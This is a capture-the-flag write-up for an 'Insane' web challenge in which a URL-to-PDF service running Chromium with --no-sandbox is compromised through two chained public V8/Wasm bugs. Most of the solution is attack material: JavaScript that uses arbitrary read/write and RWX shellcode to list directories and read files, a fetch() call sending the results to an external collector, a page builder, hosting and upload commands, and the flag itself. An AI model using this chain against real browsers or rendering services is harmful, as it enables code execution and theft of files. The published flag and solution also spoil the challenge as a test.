# coreweb

**Category:** Web  
**Difficulty:** Insane  
**Points:** 193  
**Date:** 2026-09-19  
**Author:** Takiofilip  
**Flag format:** `ctf{sha256}`  
**Flag:** `ctf{c6e27361ff139b947c1fb9a0054d3819bea59e3d967c726225356399f164b90e}`

## Challenge Overview

A page-review service renders any submitted URL with headless Chromium and saves a PDF. Its changelog disguises a list of Chromium launch flags. The worker uses Chrome `130.0.6723.31` with `--no-sandbox`, so a renderer memory corruption bug provides code execution in the container as `pwuser`. That is sufficient to read the flag file.

## Solution

### 1. Read the changelog as launch flags

The changelog's four bullets map to Chromium features and flags:

```text
"Here is the Version 8 of our tool"                -> V8
"faster Wasm compilation"                          -> --js-flags=--turboshaft-wasm
"relaxed process-isolation profile"                -> --no-sandbox
"more forgiving local certificate handling"        -> --ignore-certificate-errors
```

The page itself has no injection surface. `POST /api/review` validates the target with `new URL(value)` and a `/^https?:$/` protocol check. `file://`, `gopher://`, and the metadata IP are rejected before the renderer sees them.

Submitting a request-collector URL reveals the visitor's User-Agent:

```text
Mozilla/5.0 (X11; Linux x86_64) ... Chrome/130.0.6723.31 Safari/537.36
```

This is Playwright's bundled `chromium-1140` build on Linux x64, with external egress allowed. Since `--no-sandbox` is set, the exploit only needs to escape the V8 heap sandbox.

The service source, once readable from inside the container, confirms the launch configuration and the 75-second page window:

```js
browser = await chromium.launch({
  headless: true,
  args: ['--no-sandbox', '--disable-background-networking',
         '--ignore-certificate-errors', '--js-flags=--turboshaft-wasm'],
});
await page.goto(job.target, { waitUntil: 'domcontentloaded', timeout: 30_000 });
await page.waitForTimeout(75_000);   // 75 seconds of page time before the PDF
await page.pdf({ path: ... });
```

That window is long enough for the exploit chain. The job remains in `opening` while it runs.

### 2. Deliver a page to the worker

The worker will navigate to any HTTPS page, execute its JavaScript, and allow it to POST to the internet. Two hosting approaches worked:

- a Cloudflare quick tunnel to a local server (`cloudflared tunnel --url http://127.0.0.1:8000`), though the first hit took about 90 seconds; and
- a static host serving the uploaded file as `Content-Type: text/html` (Litterbox), which was faster and simpler.

The content type matters. A host serving `text/plain` with `X-Content-Type-Options: nosniff` will not execute the page. The payload page is one HTML file: toolkit sources in `<script type="text/plain">` blocks, a `read()` shim to return their contents, and the payload as the last executable script.

### 3. Gain renderer code execution and read the filesystem

Two public bugs in the Turboshaft/Wasm area chain on this build:

1. **CVE-2025-0291 (issue 383356864):** Turboshaft's `WasmGCTypeAnalyzer` does not stabilize the type of a single-block loop. After a few iterations, a `$struct0` local can be `$struct1`. Ref-cast confusion on a struct field gives `addrOf()` and `fakeObj()`. It affects Chrome 128 through 131 with the `V8WasmTurboshaft` trial enabled; the launch flag forces that trial on.
2. **Issue 379140430:** Signature type confusion in the `WasmToJsWrapper` tier-up path, with in-sandbox `Tuple2` corruption, turns those primitives into raw `arbRead()`/`arbWrite()` outside the sandbox and leaks the trusted cage. It affects Chrome through M132.

With arbitrary read/write and a trusted-cage pointer, hunt the trusted cage for a WebAssembly instance. Its `jump_table_start` points into an RWX page. Overwrite the page with shellcode and use ordinary syscalls: `open`, `read`, `getdents64`, and `readlink`. The process already runs as the same user that can read the flag; no extra privilege is required.

The flag is inside a directory:

```text
/home/pwuser/flag-t29hhf2947r0h38021h0whh8wf/flag-h23th2083ht8293ht20cdsnu.txt
```

Calling `open()` on the directory itself returns `EISDIR`; that can look like a permissions problem until the directory is listed.

### 4. Exfiltrate the result

The page sends everything it reads to an external collector with `fetch()`. The flag is 70 bytes, so a single request is enough. This payload runs after the toolkit's `kit/` and `vulns/` scripts load:

```js
// syscall wrappers over the RWX shellcode stubs
let pathAddr = (p) => getDataAddr(stringToArr(p));
let sysOpen   = (p, fl = 0) => syscall(2n, pathAddr(p), BigInt(fl), 0n);
let sysClose  = (fd) => syscall(3n, fd, 0n, 0n);

// read n bytes back from a raw address using the arbRead primitive
let grab = (addr, len) => {
  let out = new Uint8Array(len);
  for (let i = 0; i < len; i += 8) {
    let v = arbRead(addr + BigInt(i));
    for (let k = 0; k < 8 && i + k < len; k++) out[i+k] = Number((v >> BigInt(8*k)) & 0xffn);
  }
  return out;
};

let listDir = (p) => {
  let fd = sysOpen(p, 0x10000);                       // O_DIRECTORY
  if (fd < 0n || fd > 65535n) return null;
  let addr = getDataAddr(new Uint8Array(65536));
  let n = syscall(217n, fd, addr, 65536n);            // getdents64
  sysClose(fd);
  if (n <= 0n) return [];
  let bytes = grab(addr, Number(n));
  let dv = new DataView(bytes.buffer), off = 0, names = [];
  while (off + 19 <= bytes.length) {
    let reclen = dv.getUint16(off + 16, true);
    if (reclen === 0 || off + reclen > bytes.length) break;
    let name = new TextDecoder().decode(bytes.slice(off + 19, off + reclen - 1)).replace(/\x00+/g, "");
    if (name && name !== "." && name !== "..") names.push(name);
    off += reclen;
  }
  return names;
};

let readFile = (p, cap = 262144) => {
  let fd = sysOpen(p, 0);
  if (fd < 0n || fd > 65535n) return null;
  let addr = getDataAddr(new Uint8Array(cap));
  let n = syscall(0n, fd, addr, BigInt(cap));
  sysClose(fd);
  return n <= 0n ? new Uint8Array(0) : grab(addr, Number(n));
};

let send = (tag, body) => fetch(COLLECTOR + "?tag=" + encodeURIComponent(tag),
  { method: "POST", mode: "no-cors", body });

let out = "";
for (let d of ["/", "/home", "/home/pwuser", "/app", "/tmp", "/root"])
  out += "### " + d + " ###\n" + (listDir(d) || ["(err)"]).join("\n") + "\n";
send("LISTING", out);

for (let p of ["/home/pwuser/flag-t29hhf2947r0h38021h0whh8wf/flag-h23th2083ht8293ht20cdsnu.txt"]) {
  let b = readFile(p);
  if (b) send("FILE:" + p, new TextDecoder().decode(b));
}
```

Queue the job and inspect the collector:

```bash
TARGET=http://<host>:<port>
COLLECTOR=https://<your-collector>

# 1. queue the page
JOB=$(curl -s -X POST "$TARGET/api/review" -H 'content-type: application/json' \
      -d "{\"url\":\"https://<your-host>/page.html\"}" | jq -r .id)

# 2. watch state; "opening" for ~90s is normal, the 75s wait is on the server side
watch -n5 "curl -s $TARGET/api/review/$JOB"

# 3. read the flag off the collector
```

### Exact commands

The two memory-corruption primitives and shellcode stubs come from the public [`DanZ711/chromium-exploit-dev`](https://github.com/DanZ711/chromium-exploit-dev) toolkit. The remaining steps are from this writeup:

```bash
# 1. toolkit
git clone --depth 1 https://github.com/DanZ711/chromium-exploit-dev
cd chromium-exploit-dev          # single commit adc29c2

# 2. build the single-file page (builder in the next block)
python3 build_page.py > single.html

# 3. host it. Two hosts worked; what matters is Content-Type: text/html
python3 -m http.server 8000 &
cloudflared tunnel --url http://127.0.0.1:8000          # -> https://<rand>.trycloudflare.com
# or a static host that serves html:
curl -s -F "reqtype=fileupload" -F "time=72h" \
     -F "fileToUpload=@single.html" \
     https://litterbox.catbox.moe/resources/internals/api.php

# 4. queue the capture and watch it
curl -s -X POST "$TARGET/api/review" -H 'content-type: application/json' \
     -d '{"url":"https://<your-host>/single.html"}'
curl -s "$TARGET/api/review/<job-id>"     # queued -> opening -> rendering -> complete

# 5. the flag arrives on the collector from step 3's page
```

`build_page.py` inlines the toolkit sources so the page is self-contained. The worker navigates once, making this the only opportunity to load the scripts:

```python
# build_page.py
import os
FILES = ["kit/common/convert.js", "kit/common/dom.js", "kit/common/stability.js",
         "kit/common/v8-utils.js", "kit/common/versions.js", "kit/common/wasm-module-builder.js",
         "vulns/symbols.js", "kit/fingerprint/d8.js", "kit/fingerprint/useragent.js",
         "vulns/memcor/CVE-2025-0291.js", "kit/v8/cage.js", "vulns/v8sbx/379140430.js",
         "kit/v8/memory.js", "kit/v8/rwx/egghunt.js", "kit/v8/rwx/isolate.js",
         "kit/v8/rwx/partitionalloc.js", "kit/v8/rwx/wasmrwx.js", "kit/v8/rwx.js",
         "kit/shellcodes/x64.js", "kit/shellcodes/x64-win.js", "kit/shellcodes/x64-linux.js",
         "kit/fingerprint/win.js", "kit/fingerprint/linux.js"]

blocks = ['<script type="text/plain" id="f:%s">\n%s\n</script>' % (f, open(f).read()) for f in FILES]
main = open("main.js").read()          # patched: CTF payload appended, EXFIL webhook replaced

print("""<!doctype html><html><head><meta charset="utf-8"><title>r</title></head>
<body><div id="log" style="white-space:pre"></div>
<script>window.read = async (p) => document.getElementById("f:" + p).textContent;</script>
%s
<script>
%s
</script></body></html>""" % ("\n".join(blocks), main))
```

The include order matters: `versions.js` defines struct offsets and `wasm-module-builder.js` provides the encoder before `vulns/memcor/CVE-2025-0291.js` runs. `x64-linux.js` must load last because the syscall wrappers need an RWX stub.

## Notes

- The public toolkit's `getDataAddr()` returns the address of an internal copy of the buffer, not the original buffer. As a kernel output pointer, a syscall can report a correct byte count while the data lands somewhere unreadable. An initial run showed a working chain but empty files. Keep the buffer and read the returned address using `arbRead()`, as above, or avoid the helper.
- The toolkit's `main.js` contains a hardcoded exfiltration webhook belonging to its author. Replace that `EXFIL` destination before running it, or exploit logs, directory listings, and flag contents will be sent there.
- Network egress and page execution are the only guarantees. Discover filesystem layout, including whether the flag is a file or directory, from inside the container.

## Flag

```text
ctf{c6e27361ff139b947c1fb9a0054d3819bea59e3d967c726225356399f164b90e}
```
